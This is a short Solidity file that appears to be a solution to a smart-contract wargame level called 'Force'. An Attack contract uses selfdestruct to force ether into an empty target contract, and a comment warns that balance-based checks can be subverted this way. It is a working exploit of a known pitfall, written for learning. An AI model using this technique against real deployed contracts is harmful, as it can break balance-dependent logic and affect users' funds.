// SPDX-License-Identifier: MIT

/**
    Solution for this: using 'selfdestruct', need to cast to address payable of contract Force
    It is important around this code 'address(this).balance == 0' for any contract logic cause
        attack can be sneaky using 'selfdestruct' to twist that
 */

pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack {
    Force force;

    constructor(address _force) public {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}